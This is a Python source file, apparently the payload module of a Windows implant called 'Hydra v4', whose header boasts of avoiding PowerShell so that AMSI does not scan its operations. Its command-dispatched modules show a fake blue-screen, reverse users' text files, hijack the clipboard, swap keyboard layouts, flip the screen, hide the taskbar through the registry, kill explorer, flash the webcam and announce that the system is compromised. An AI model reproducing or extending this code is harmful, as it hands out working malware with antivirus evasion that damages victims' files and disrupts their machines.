"""
Hydra v4 — Payload module system.
ALL modules use pure Python + ctypes. ZERO PowerShell child processes.
No PowerShell = no AMSI scanning of payload operations.
"""
import os
import sys
import time
import random
import threading
import subprocess
import ctypes
import winreg
from ctypes import wintypes

# ─── Win32 API bindings ──────────────────────────────

_user32 = ctypes.windll.user32
_kernel32 = ctypes.windll.kernel32
_winmm = ctypes.windll.winmm

# Window / UI
SWP_SHOWWINDOW = 0x0040
HWND_TOPMOST = -1
WS_POPUP = 0x80000000
WS_VISIBLE = 0x10000000
CS_VREDRAW = 0x0001
CS_HREDRAW = 0x0002
IDI_APPLICATION = 32512
COLOR_WINDOWFRAME = 6
WM_PAINT = 0x000F
WM_KEYDOWN = 0x0100
WM_DESTROY = 0x0002
VK_ESCAPE = 0x1B
DT_CENTER = 0x0001
DT_VCENTER = 0x0004
DT_WORDBREAK = 0x0010

# Monitor / display
SM_CXSCREEN = 0
SM_CYSCREEN = 1

# Keyboard
INPUT_KEYBOARD = 1
KEYEVENTF_KEYUP = 0x0002
VK_CONTROL = 0x11
VK_MENU = 0x12  # Alt
VK_DOWN = 0x28

# Process
PROCESS_TERMINATE = 0x0001

# ─── Window class for fullscreen overlays ────────────

def _create_fullscreen_window(title: str, text: str, bg_color: int,
                               dismissable: bool = True, timeout_ms: int = 0):
    """
    Create a fullscreen topmost window with text.
    bg_color = 0x00BBGGRR (Windows COLORREF format).
    Returns immediately if timeout_ms=0; otherwise blocks.
    """
    hinstance = _kernel32.GetModuleHandleW(None)

    wnd_class = ctypes.c_wchar_p(title)

    WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_long, wintypes.HWND,
                                  wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)

    # We need to store the callback to prevent GC
    _window_procs = {}

    def _make_wndproc(bg, txt, dismiss):
        @WNDPROC
        def wndproc(hwnd, msg, wparam, lparam):
            if msg == WM_PAINT:
                ps = ctypes.create_string_buffer(64)
                hdc = _user32.BeginPaint(hwnd, ctypes.byref(ps))
                # Fill background
                brush = ctypes.windll.gdi32.CreateSolidBrush(bg)
                rect = ctypes.create_string_buffer(16)
                _user32.GetClientRect(hwnd, ctypes.byref(rect))
                _user32.FillRect(hdc, ctypes.byref(rect), brush)
                ctypes.windll.gdi32.DeleteObject(brush)
                # Draw text
                _user32.SetBkMode(hdc, 1)  # TRANSPARENT
                ctypes.windll.gdi32.SetTextColor(hdc, 0x00FFFFFF)
                # Select a font
                font = ctypes.windll.gdi32.CreateFontW(
                    42, 0, 0, 0, 700, 0, 0, 0, 0, 0, 0, 0, 0,
                    ctypes.c_wchar_p("Consolas")
                )
                old_font = ctypes.windll.gdi32.SelectObject(hdc, font)
                ctypes.windll.user32.DrawTextW(
                    hdc, ctypes.c_wchar_p(txt), -1,
                    ctypes.byref(rect), DT_CENTER | DT_VCENTER | DT_WORDBREAK
                )
                ctypes.windll.gdi32.SelectObject(hdc, old_font)
                ctypes.windll.gdi32.DeleteObject(font)
                _user32.EndPaint(hwnd, ctypes.byref(ps))
                return 0
            elif msg == WM_KEYDOWN and dismiss:
                if wparam == VK_ESCAPE:
                    _user32.DestroyWindow(hwnd)
                return 0
            elif msg == WM_DESTROY:
                _user32.PostQuitMessage(0)
                return 0
            return _user32.DefWindowProcW(hwnd, msg, wparam, lparam)
        return wndproc

    wndproc = _make_wndproc(bg_color, text, dismissable)
    _window_procs[title] = wndproc

    wc = ctypes.create_string_buffer(80)
    wc_offset = 0
    ctypes.memmove(wc, ctypes.c_uint32(80), 4); wc_offset += 4
    style = CS_VREDRAW | CS_HREDRAW
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.c_uint32(style), 4); wc_offset += 4
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.cast(wndproc, ctypes.c_void_p),
                   ctypes.sizeof(ctypes.c_void_p)); wc_offset += ctypes.sizeof(ctypes.c_void_p)
    wc_offset += 8  # cbClsExtra + cbWndExtra
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.c_void_p(hinstance),
                   ctypes.sizeof(ctypes.c_void_p)); wc_offset += ctypes.sizeof(ctypes.c_void_p)
    icon = _user32.LoadIconW(0, ctypes.c_void_p(IDI_APPLICATION))
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.c_void_p(icon),
                   ctypes.sizeof(ctypes.c_void_p)); wc_offset += ctypes.sizeof(ctypes.c_void_p)
    cursor = _user32.LoadCursorW(0, ctypes.c_void_p(32512))  # IDC_ARROW
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.c_void_p(cursor),
                   ctypes.sizeof(ctypes.c_void_p)); wc_offset += ctypes.sizeof(ctypes.c_void_p)
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.c_uint32(COLOR_WINDOWFRAME + 1), 4)
    wc_offset += 8
    ctypes.memmove(ctypes.byref(wc, wc_offset), ctypes.c_wchar_p(title),
                   ctypes.sizeof(ctypes.c_wchar_p) * len(title)); wc_offset += ctypes.sizeof(ctypes.c_wchar_p) * (len(title) + 1)

    atom = _user32.RegisterClassExW(ctypes.byref(wc))
    if not atom:
        return "FAILED: RegisterClassEx"

    w = _user32.GetSystemMetrics(SM_CXSCREEN)
    h = _user32.GetSystemMetrics(SM_CYSCREEN)

    hwnd = _user32.CreateWindowExW(
        0x08000000 | 0x00000008,  # WS_EX_TOPMOST | WS_EX_TOOLWINDOW
        ctypes.c_wchar_p(str(atom)), wnd_class,
        WS_POPUP | WS_VISIBLE,
        0, 0, w, h, 0, 0, hinstance, 0
    )

    if not hwnd:
        return "FAILED: CreateWindowEx"

    _user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0,
                         SWP_SHOWWINDOW | 0x0001 | 0x0002)  # SWP_NOMOVE|SWP_NOSIZE

    if timeout_ms > 0:
        end = time.time() + timeout_ms / 1000.0
        while time.time() < end:
            msg = ctypes.create_string_buffer(28)
            if _user32.PeekMessageW(ctypes.byref(msg), hwnd, 0, 0, 1):
                _user32.TranslateMessage(ctypes.byref(msg))
                _user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.01)
        _user32.DestroyWindow(hwnd)
    else:
        # Run message loop (blocks until window closed)
        msg = ctypes.create_string_buffer(28)
        while _user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
            _user32.TranslateMessage(ctypes.byref(msg))
            _user32.DispatchMessageW(ctypes.byref(msg))

    _user32.UnregisterClassW(ctypes.c_wchar_p(str(atom)), hinstance)
    return "OK"


def _send_key(vk_code: int, up: bool = False):
    """Send a single key event via SendInput."""
    class KEYBDINPUT(ctypes.Structure):
        _fields_ = [("wVk", wintypes.WORD), ("wScan", wintypes.WORD),
                     ("dwFlags", wintypes.DWORD), ("time", wintypes.DWORD),
                     ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong))]
    class INPUT(ctypes.Structure):
        class _U(ctypes.Union):
            _fields_ = [("ki", KEYBDINPUT)]
        _anonymous_ = ("u",)
        _fields_ = [("type", wintypes.DWORD), ("u", _U)]

    inp = INPUT()
    inp.type = INPUT_KEYBOARD
    inp.ki.wVk = vk_code
    inp.ki.dwFlags = KEYEVENTF_KEYUP if up else 0
    ctypes.windll.user32.SendInput(1, ctypes.byref(inp), ctypes.sizeof(INPUT))


# ─── Module Registry ─────────────────────────────────

MODULE_REGISTRY = {}


def register(name):
    def wrapper(fn):
        MODULE_REGISTRY[name] = fn
        return fn
    return wrapper


def execute_module(name: str, args: list = None):
    if name not in MODULE_REGISTRY:
        return f"Unknown module: {name}"
    try:
        return MODULE_REGISTRY[name](*(args or []))
    except Exception as e:
        return f"Module '{name}' error: {e}"


# ═══════════════════════════════════════════════════════
# MODULES — Pure Python + ctypes, NO PowerShell
# ═══════════════════════════════════════════════════════


@register("ping")
def mod_ping():
    import socket
    hostname = socket.gethostname()
    username = os.environ.get("USERNAME", "?")
    return f"PONG from {hostname}\\{username} | PID={os.getpid()}"


@register("popup")
def mod_popup(title: str = "System Message", text: str = "..."):
    ctypes.windll.user32.MessageBoxW(0, text, title, 0x40)
    return f"Popup shown: {title}"


@register("notepad")
def mod_notepad(count: str = "3", message: str = ""):
    n = int(count) if count.isdigit() else 3
    for _ in range(n):
        try:
            subprocess.Popen("notepad.exe", shell=True)
            time.sleep(0.2)
        except:
            pass
    return f"Spawned {n} Notepad windows"


@register("wallpaper")
def mod_wallpaper(path: str = None):
    """Change desktop wallpaper via SystemParametersInfo (pure ctypes)."""
    import struct

    if path and os.path.exists(path):
        wp_path = os.path.abspath(path)
    else:
        wp_path = os.path.join(os.environ.get("TEMP", "."), "hydra_wp.bmp")
        # Create 1x1 black BMP
        bmp = bytes([0x42, 0x4D, 0x3A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x36, 0x00, 0x00, 0x00, 0x28, 0x00, 0x00, 0x00, 0x01, 0x00,
                      0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x18, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
        with open(wp_path, "wb") as f:
            f.write(bmp)

    # SPI_SETDESKWALLPAPER = 20, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE = 3
    _user32.SystemParametersInfoW(20, 0, wp_path, 3)
    return f"Wallpaper set: {wp_path}"


@register("cursor")
def mod_cursor(duration: str = "10"):
    d = int(duration) if duration.isdigit() else 10
    threading.Thread(target=_jiggle_cursor, args=(d,), daemon=True).start()
    return f"Cursor jiggling for {d}s"


def _jiggle_cursor(duration: int):
    end = time.time() + duration
    while time.time() < end:
        _user32.SetCursorPos(random.randint(100, 800), random.randint(100, 600))
        time.sleep(random.uniform(0.1, 0.8))


@register("screen_flash")
def mod_screen_flash(color: str = "red", count: str = "3"):
    """Fullscreen colored flash — pure Win32 window, no .NET."""
    colors = {
        "red":    0x000000FF, "blue":   0x00FF0000,
        "green":  0x0000FF00, "black":  0x00000000,
        "white":  0x00FFFFFF, "yellow": 0x0000FFFF,
        "purple": 0x00800080,
    }
    bg = colors.get(color.lower(), 0x000000FF)
    c = int(count) if count.isdigit() else 3

    for i in range(c):
        threading.Thread(
            target=_create_fullscreen_window,
            args=(f"hydra_flash_{i}", "", bg, False, 300),
            daemon=True
        ).start()
        time.sleep(0.05)
    time.sleep(0.5)
    return f"Flashed {color} {c}x"


@register("cd_tray")
def mod_cd_tray(action: str = "open"):
    try:
        _winmm.mciSendStringW(
            f"set cdaudio door {'open' if action == 'open' else 'closed'}",
            None, 0, 0
        )
        return f"CD tray: {action}"
    except:
        return "CD tray: FAILED"


@register("file_reverse")
def mod_file_reverse(path: str = None):
    docs = path or os.path.join(os.path.expanduser("~"), "Documents")
    count = 0
    try:
        for root, dirs, files in os.walk(docs):
            for f in files:
                if f.endswith(".txt") and ".bak" not in f:
                    fp = os.path.join(root, f)
                    try:
                        with open(fp, "r", encoding="utf-8", errors="ignore") as fh:
                            content = fh.read()
                        with open(fp + ".bak", "w", encoding="utf-8") as fh:
                            fh.write(content)
                        with open(fp, "w", encoding="utf-8") as fh:
                            fh.write(content[::-1])
                        count += 1
                    except:
                        pass
                    if count >= 20:
                        break
    except:
        pass
    return f"Reversed {count} .txt files"


@register("selfdestruct")
def mod_selfdestruct():
    try:
        from hydra.sandbox import self_destruct
        self_destruct()
        os._exit(0)
    except:
        pass
    return "Self-destruct initiated"


# ═══════════════════════════════════════════════════════
# SPRINT 2 — Fullscreen / Audio / Browser / Input
# ═══════════════════════════════════════════════════════


@register("bsod")
def mod_bsod():
    """Fake BSOD via pure Win32 fullscreen window. Esc to dismiss."""
    bsod_text = (
        ":(\r\n\r\n"
        "Your PC ran into a problem and needs to restart.\r\n\r\n"
        "We're just collecting some error info, and then we'll restart for you.\r\n\r\n"
        "0% complete\r\n\r\n"
        "For more info visit https://www.windows.com/stopcode\r\n\r\n"
        "Stop code: HYDR4_V4_VIOLATION"
    )
    _create_fullscreen_window(
        "HydraBSOD", bsod_text, 0x00AA0000,  # Dark blue
        dismissable=True, timeout_ms=0
    )
    return "BSOD dismissed"


@register("audio")
def mod_audio():
    """TTS via SAPI COM — pure ctypes, no PowerShell."""
    try:
        # CoInitialize
        ctypes.windll.ole32.CoInitialize(0)

        # Create SAPI SpVoice COM object
        # CLSID: {96749377-3391-11D2-9EE3-00C04F797396}
        CLSCTX_INPROC_SERVER = 1
        clsid = ctypes.create_string_buffer(bytes([
            0x77,0x93,0x74,0x96, 0x91,0x33,0xD2,0x11,
            0x9E,0xE3,0x00,0xC0,0x4F,0x79,0x73,0x96]))
        # IID_ISpeechVoice: {6C837B49-0A91-11D2-B8EA-00A0C9B4022E}
        iid = ctypes.create_string_buffer(
            bytes([0x49,0x7B,0x83,0x6C,0x91,0x0A,0xD2,0x11,
                   0xB8,0xEA,0x00,0xA0,0xC9,0xB4,0x02,0x2E]))

        voice = ctypes.c_void_p()
        hr = ctypes.windll.ole32.CoCreateInstance(
            ctypes.byref(clsid), 0, CLSCTX_INPROC_SERVER,
            ctypes.byref(iid), ctypes.byref(voice)
        )
        if hr < 0 or not voice:
            ctypes.windll.ole32.CoUninitialize()
            return "TTS: FAILED (no SAPI?)"

        # Get vtable and call Speak (index 12)
        vtbl = ctypes.cast(voice, ctypes.POINTER(ctypes.c_void_p)).contents
        speak_fn = ctypes.cast(
            ctypes.cast(vtbl, ctypes.POINTER(ctypes.c_void_p))[12],
            ctypes.WINFUNCTYPE(ctypes.c_long, ctypes.c_void_p,
                               ctypes.c_wchar_p, ctypes.c_ulong, ctypes.c_void_p)
        )
        speak_fn(voice, "Hello. This is Hydra. Your system has been compromised. Have a nice day.", 0, 0)

        # Release via IUnknown::Release (vtable index 2)
        release_fn = ctypes.cast(
            ctypes.cast(vtbl, ctypes.POINTER(ctypes.c_void_p))[2],
            ctypes.WINFUNCTYPE(ctypes.c_ulong, ctypes.c_void_p)
        )
        release_fn(voice)
        ctypes.windll.ole32.CoUninitialize()
        return "TTS played"
    except Exception as e:
        return f"TTS error: {e}"


@register("browser")
def mod_browser(url: str = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"):
    try:
        os.startfile(url)
    except:
        # ShellExecute fallback
        _user32.ShellExecuteW(0, ctypes.c_wchar_p("open"),
                              ctypes.c_wchar_p(url), 0, 0, 1)
    return f"Browser opened: {url}"


@register("webcam")
def mod_webcam():
    """Launch camera app via ShellExecute (no PS)."""
    try:
        _user32.ShellExecuteW(
            0, ctypes.c_wchar_p("open"),
            ctypes.c_wchar_p("microsoft.windows.camera:"),
            0, 0, 1  # SW_SHOWNORMAL
        )
        time.sleep(2)
        # Kill the camera process
        _kill_process("WindowsCamera.exe")
        return "Webcam flashed"
    except:
        return "Webcam: FAILED"


@register("keyboard_swap")
def mod_keyboard_swap():
    """Swap keyboard layout using LoadKeyboardLayout (pure ctypes)."""
    # Activate Russian layout (0x0419 = ru-RU)
    # KLF_ACTIVATE = 0x00000001
    result = _user32.LoadKeyboardLayoutW("00000419", 1)
    if result:
        return "Keyboard: ru-RU (Alt+Shift to switch back)"
    # Fallback: try German
    result = _user32.LoadKeyboardLayoutW("00000407", 1)
    return "Keyboard swapped" if result else "Keyboard: FAILED"


@register("clipboard")
def mod_clipboard(msg: str = None):
    """Replace clipboard via clip.exe."""
    if not msg:
        garbage = [
            "HYDRA WAS HERE",
            "you have been hacked lol",
            "01101000 01100001 01100011 01101011 01100101 01100100",
        ]
        msg = random.choice(garbage)
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.run(
            f'echo {msg} | clip',
            startupinfo=si, shell=True, timeout=5
        )
    except:
        pass
    return f"Clipboard replaced: {msg}"


@register("monitor")
def mod_monitor():
    """Flip screen via Ctrl+Alt+Down keybd_event (pure ctypes, no SendKeys)."""
    # Press Ctrl+Alt+Down
    _send_key(VK_CONTROL)
    _send_key(VK_MENU)
    _send_key(VK_DOWN)
    time.sleep(0.05)
    _send_key(VK_DOWN, True)
    _send_key(VK_MENU, True)
    _send_key(VK_CONTROL, True)
    return "Screen flipped (Ctrl+Alt+Up to restore)"


@register("taskbar")
def mod_taskbar():
    """Hide taskbar via registry (pure winreg)."""
    try:
        # Toggle taskbar auto-hide via StuckRects3
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\StuckRects3",
            0, winreg.KEY_READ | winreg.KEY_SET_VALUE
        )
        data = bytearray(winreg.QueryValueEx(key, "Settings")[0])
        data[8] ^= 0x01  # Flip the auto-hide bit
        winreg.SetValueEx(key, "Settings", 0, winreg.REG_BINARY, bytes(data))
        winreg.CloseKey(key)

        # Hide desktop icons
        key2 = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key2, "HideIcons", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key2)

        # Restart explorer
        _kill_process("explorer.exe")
        return "Taskbar + icons hidden"
    except:
        return "Taskbar: FAILED"


# ═══════════════════════════════════════════════════════
# UTILITY
# ═══════════════════════════════════════════════════════


def _kill_process(name: str):
    """Kill a process by name via TerminateProcess."""
    try:
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        subprocess.run(
            ["taskkill", "/f", "/im", name],
            startupinfo=si, capture_output=True, timeout=5
        )
    except:
        pass
